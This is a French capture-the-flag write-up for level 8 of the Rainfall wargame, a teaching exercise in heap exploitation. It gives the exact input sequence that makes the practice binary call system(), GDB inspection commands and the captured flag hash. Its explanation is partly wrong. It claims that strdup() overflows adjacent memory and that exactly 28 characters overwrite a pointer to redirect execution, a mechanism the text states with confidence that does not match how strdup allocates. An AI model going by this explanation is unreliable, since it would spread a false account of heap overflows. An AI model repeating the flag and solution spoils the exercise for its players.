# Rainfall - Niveau 8

## Objectif

Exploiter une vulnérabilité de type heap overflow afin de manipuler la mémoire dynamique (tas) pour détourner l'exécution et récupérer le flag.

## Analyse détaillée de la vulnérabilité

Le programme permet trois commandes :

* `auth [argument]` : alloue dynamiquement `malloc(4)`.
* `service [argument]` : utilise `strdup()` pour dupliquer une chaîne fournie par l'utilisateur, ce qui réalise une allocation dynamique en fonction de la taille de l'entrée.
* `login` : vérifie des pointeurs internes pour éventuellement exécuter `system()`.

La vulnérabilité provient du fait que les allocations dynamiques (`malloc`) réalisées pour la commande `auth` sont très petites (4 octets seulement). La commande `service`, elle, peut allouer un espace beaucoup plus grand avec `strdup()`.

Lorsqu'une commande `service` reçoit une entrée suffisamment longue (28 caractères 'A'), elle déborde légèrement dans la mémoire adjacente, écrasant ainsi un pointeur voisin en mémoire (probablement celui alloué précédemment par `auth`).

## Stratégie d'attaque

1. Réaliser une petite allocation avec `auth` (pour réserver une mémoire contiguë sur le tas).
2. Réaliser ensuite une grande allocation contrôlée avec `service`, provoquant un débordement précis pour écraser des pointeurs internes en mémoire.
3. Déclencher la commande `login` pour vérifier les conditions en mémoire modifiées par le débordement et appeler la fonction `system()`.

## Exploit détaillé

### Commandes utilisées

```bash
./level8
auth aaaa
service AAAAAAAAAAAAAAAAAAAAAAAAAAAA
login
```

### Pourquoi précisément 28 A ?

Cette taille est cruciale :

* Trop peu de 'A' ne permettrait pas d'écraser le pointeur visé.
* Trop de 'A' provoquerait une corruption excessive et ferait échouer l'exploit.

Exactement **28 caractères** permettent de parfaitement écraser le pointeur interne et le contrôler pour rediriger l'exécution vers la commande système désirée (`system`).

## Vérification avec GDB

Voici comment analyser l'exploit en détail avec GDB :

```bash
gdb ./level8
```

### 1. Définir des breakpoints utiles :

```gdb
(gdb) break malloc
(gdb) break strdup
(gdb) break free
(gdb) break system
```

### 2. Lancer le programme dans GDB :

```gdb
(gdb) run
```

Entrer ensuite :

```
auth aaaa
service AAAAAAAAAAAAAAAAAAAAAAAAAAAA
login
```

### 3. Observer les allocations mémoire :

```gdb
(gdb) x/20x 0x804a008
(gdb) x/20x 0x804a018
```

Vous pouvez observer clairement comment le débordement modifie les pointeurs internes en mémoire.

## Résultat obtenu (flag)

```
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

## Conclusion

Ce niveau illustre une attaque classique par heap overflow, mettant en avant les risques des allocations dynamiques et les débordements de mémoire non contrôlés. Une bonne compréhension des structures mémoires (`heap`) est essentielle pour exploiter précisément ce type de vulnérabilité.
